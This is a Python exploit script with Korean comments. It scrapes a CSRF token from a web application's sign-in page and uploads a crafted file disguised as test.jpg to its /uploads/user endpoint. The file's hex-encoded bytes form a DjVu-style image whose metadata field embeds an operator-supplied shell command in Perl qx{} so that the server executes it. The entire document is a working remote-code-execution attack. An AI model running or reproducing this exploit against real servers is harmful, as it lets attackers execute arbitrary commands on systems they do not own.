import sys
import re
import requests


target = sys.argv[1] #대상 URL
command = sys.argv[2] 
session = requests.session() #세션을 생성한다. 
CSRF_PATTERN = re.compile(rb'csrf-token" content="(.*?)" />')

def get_payload(command): # get_payload()는 원격 코드 실행(RCE)을 발생 시키기 위한 페이로드를 구성하는 함수이다. 
    rce_payload = b'\x41\x54\x26\x54\x46\x4f\x52\x4d'
    rce_payload += (len(command) + 0x55).to_bytes(length=4, byteorder='big', signed=True)
    rce_payload += b'\x44\x4a\x56\x55\x49\x4e\x46\x4f\x00\x00\x00\x0a\x00\x00\x00\x00\x18\x00\x2c\x01\x16\x01\x42\x47\x6a\x70\x00\x00\x00\x00\x41\x4e\x54\x61'
    rce_payload += (len(command) + 0x2f).to_bytes(length=4, byteorder='big', signed=True)
    rce_payload += b'\x28\x6d\x65\x74\x61\x64\x61\x74\x61\x0a\x09\x28\x43\x6f\x70\x79\x72\x69\x67\x68\x74\x20\x22\x5c\x0a\x22\x20\x2e\x20\x71\x78\x7b'
    rce_payload += command.encode()
    rce_payload += b'\x7d\x20\x2e\x20\x5c\x0a\x22\x20\x62\x20\x22\x29\x20\x29\x0a'
    return rce_payload

def csrf_token(): #CSRF토큰을 탈취하는 역할을 한다. 
    response = session.get(f'{target}/users/sign_in', headers={'Origin': target})
    g = CSRF_PATTERN.search(response.content)
    assert g, 'No CSRF Token found'

    return g.group(1).decode()


def exploit(): #exploit() 함수는 CSRF 취약점을 악용하여, 원격 코드 실행을 시도한다.
    files = [('file', ('test.jpg', get_payload(command), 'image/jpeg'))] #get_payload(command)함수를 통해 특정 명령어를 포함하는 페이로드가 생성되며, image형식인 파일명 test.jpg로 설정된다.
    session.post(f'{target}/uploads/user', files=files, headers={'X-CSRF-Token': csrf_token()})


if __name__ == '__main__':
    exploit() # exploit() 함수 실행
    print('finish test')